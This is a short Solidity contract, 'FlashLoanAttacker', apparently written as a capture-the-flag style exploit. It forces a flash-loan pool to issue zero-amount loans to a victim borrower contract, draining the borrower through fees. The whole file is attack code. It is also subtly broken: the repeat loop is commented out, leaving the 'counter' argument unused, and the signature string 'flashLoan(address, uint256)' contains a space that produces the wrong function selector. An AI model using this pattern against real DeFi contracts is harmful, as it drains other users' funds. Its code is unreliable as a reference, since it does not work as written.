// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";

contract FlashLoanAttacker is ReentrancyGuard {

    using Address for address;

    function attackBorrower(address pool, address borrower, uint counter) external nonReentrant {
        require(pool.isContract(), "Pool must be a deployed contract");
        require(borrower.isContract(), "Borrower must be a deployed contract");
        // for (uint i = 0; i < counter; i++) {
            pool.functionCall(
                abi.encodeWithSignature(
                    "flashLoan(address, uint256)",
                    borrower,
                    0
                )
            );
        // }
    }
}